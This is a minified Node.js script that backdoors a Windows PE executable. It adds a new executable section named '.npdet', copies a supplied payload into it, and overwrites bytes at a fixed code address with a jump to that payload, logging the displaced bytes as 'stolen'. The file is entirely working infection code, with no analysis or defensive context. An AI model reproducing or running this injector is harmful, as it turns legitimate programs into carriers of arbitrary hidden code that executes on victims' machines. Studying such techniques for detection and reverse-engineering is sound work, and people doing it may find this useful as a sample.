const fs=require('fs'),c=require('crypto');
const img=fs.readFileSync(process.argv[2]),pl=fs.readFileSync(process.argv[3]);
const sha=b=>c.createHash('sha256').update(b).digest('hex');
console.log('clean',sha(img),'payload',sha(pl),'plen',pl.length,'size',img.length);
const b=Buffer.from(img);const pe=b.readUInt32LE(0x3c);const ns=b.readUInt16LE(pe+6);const opt=pe+24;const tbl=opt+b.readUInt16LE(pe+20);const hdr=tbl+ns*40;
const fa=b.readUInt32LE(opt+36),isz=b.readUInt32LE(opt+56),hsz=b.readUInt32LE(opt+60);
console.log({ns,fa:fa.toString(16),isz:isz.toString(16),hsz:hsz.toString(16),hdr,base:b.readBigUInt64LE(opt+24).toString(16),chk:b.readUInt32LE(opt+64).toString(16)});
const raw=(b.length+fa-1)&~(fa-1);const e=Buffer.alloc(40);e.write('.npdet');e.writeUInt32LE(0x1000,8);e.writeUInt32LE(0xae000,12);e.writeUInt32LE(0x1000,16);e.writeUInt32LE(raw,20);e.writeUInt32LE(0x60000020,36);
e.copy(b,hdr);b.writeUInt16LE(ns+1,pe+6);b.writeUInt32LE(isz+0x1000,opt+56);
let out=Buffer.concat([b,Buffer.alloc(raw+0x1000-b.length)]);
// file offset of rva
function off(rva){const n=out.readUInt16LE(pe+6);for(let i=0;i<n;i++){const en=tbl+i*40;const vs=out.readUInt32LE(en+8),va=out.readUInt32LE(en+12),rs=out.readUInt32LE(en+16),ro=out.readUInt32LE(en+20);if(!rs||!ro)continue;if(rva>=va&&rva<va+Math.max(vs,rs))return ro+rva-va}}
const ho=off(0x44972);console.log('stolen',out.slice(ho,ho+9).toString('hex'));
pl.copy(out,off(0xae000));const j=Buffer.alloc(9,0xcc);j[0]=0xe9;j.writeInt32LE(0xae000-(0x44972+5),1);j.copy(out,ho);
console.log('patched',sha(out));
